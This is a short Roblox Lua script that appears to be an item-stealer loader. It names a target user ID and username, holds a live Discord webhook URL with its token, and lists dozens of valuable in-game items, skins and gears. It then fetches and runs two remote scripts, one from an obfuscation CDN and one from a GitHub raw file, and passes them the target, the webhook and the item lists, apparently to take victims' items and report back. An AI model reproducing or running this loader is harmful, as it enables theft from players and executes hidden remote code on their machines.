local TARGET_ID = 12020995366
local TARGET_USER = "Lex_ontop20"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1575750704042086411/rpZR6FEfKHhxNlWQyCHu8PkvxjaX8wpsatU1e_7a6KevgXasN9TTCjmpPVDLzrDcjjPv"

local TargetBrainrots = {
    ["Garama and Madundung"] = true,
    ["Capitano Moby"] = true,
    ["Pizza and Ranch"] = true,
    ["Gold and Diamond"] = true,
    ["Dragon Cannelloni"] = true,
    ["Globa Steppa"] = true,
    ["La Casa Boo"] = true,
    ["Cerberus"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["Foxini Lanternini"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Boppin Bunny"] = true,
    ["Burguro and Fryuro"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Cooki and Milki"] = true,
    ["Cloverat Clapat"] = true,
    ["Festive 67"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Fragola La La La"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Taco Combinasion"] = true,
    ["S'more Serat"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Swaggy Bros"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true,
    ["La Fuse Machine"] = true,
    ["La Craft Machine"] = true
}

local TargetBaseSkins = {
    ["Summer"] = true,
    ["Rose"] = true,
    ["Octo"] = true,
    ["Halloween"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Lucky"] = true,
    ["Gingerbread"] = true,
    ["Easter"] = true,
    ["Bunny Basket"] = true,
    ["Christmas"] = true,
    ["Aquatic"] = true
}

local TargetGears = {
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Santa's Sleigh"] = true,
    ["Candy Sentry"] = true,
    ["Blackhole Bomb"] = true,
    ["Skeleton Dragon"] = true,
    ["Crystal Slap"] = true,
    ["Phantom Slap"] = true,
    ["Yin Yang Slap"] = true,
    ["Yin Yang Lamp"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Demon's Head"] = true,
    ["Cursed Slap"] = true,
    ["Divine Slap"] = true,
    ["Cyber Slap"] = true,
    ["Lava Blaster"] = true,
    ["Candy Slap"] = true,
    ["Alien Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Bloodmoon Hammer"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://cdn.luaprotect.dev/u/4d91c5/axqYNe79Kw5IjgBa"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)